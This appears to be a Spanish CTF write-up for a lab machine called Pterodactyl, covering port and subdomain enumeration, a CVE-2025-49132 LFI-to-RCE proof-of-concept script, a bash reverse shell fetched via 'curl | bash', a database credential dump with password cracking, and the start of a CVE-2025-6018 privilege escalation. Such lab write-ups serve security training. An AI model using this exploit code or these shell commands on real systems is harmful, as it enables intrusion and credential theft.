
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.3.189 -oG allPorts`

```shell
[*] IP Address: 10.129.3.189
[*] Open ports: 22,80
```

`nmap -p22,80 -sCV 10.129.3.189 -oN targeted`

`wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://pterodactyl.htb/FUZZ`

No encontramos nada, pero como vemos que habla de un subdominio `play` haremos una enumeración de subdominios
`wfuzz -c --hc 404,302 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.pterodactyl.htb" http://pterodactyl.htb`

encontramos el subdominio `panel`
Encontrando un panel de login en la url `http://panel.pterodactyl.htb/auth/login`

En el panel buscamos sobre vulnerabilidades de este panel y en exploit-db encontramos un `CVE-2025-49132` en cual es un RCE que nos permite obtener las credenciales de acceso a una base de datos interna
`https://www.exploit-db.com/exploits/52341`

Encontramos un POC también que nos permite explotar un LFI to RCE el script es el siguiente
```python
import sys, os

host=sys.argv[1]
payload=sys.argv[2].replace(' ','\\$\\\\{IFS\\\\}')

# Ugly but have to use curl since the package requests won't allow us to send characters like '{' without encoding them
os.system(f"curl \"http://{host}/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\"")

os.system(f"curl \"http://{host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"")
```

En nuestra maquina atacante nos creamos un archivo `.sh` con un oneliner 
```bash
sh -i >& /dev/tcp/10.10.15.111/443 0>&1
```

Nos abriremos un servidor con python `python3 -m http.server 8080`
Y nos ponemos en escucha con penelope `penelope -p 8080`

y ejecutamos el `poc.py` con  `python3 poc.py panel.pterodactyl.htb 'curl http://10.10.15.111:8080/onelines.sh | bash'`

Obteniendo asi una reverse shell

Accedemos al mariadb que esta abierto que hemos visto con el CVE anterior

mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1

select * from users

```ad-hint
headmonitor::$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2

phileasfogg3::$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
```

Lo crackeamos con jhon
```ad-hint
phileasfogg3::!QAZ2wsx
```

Vemos los archivos con permisos SUID y no encontramos nada, en la ruta /var/mail encontramos un mail que nos habla de un error en el servicio udisksd el cual tiene el  `CVE-2025-6019` pero pare explotar este antes necesitamos explotar CVE-2025-6018

### CVE-2025-6018
Haremos los pasos que se indican en la declaración de payload de `https://www.exploit-db.com/exploits/52386` creando un archivo en la ruta `~/.pam_environment` en la maquina victima

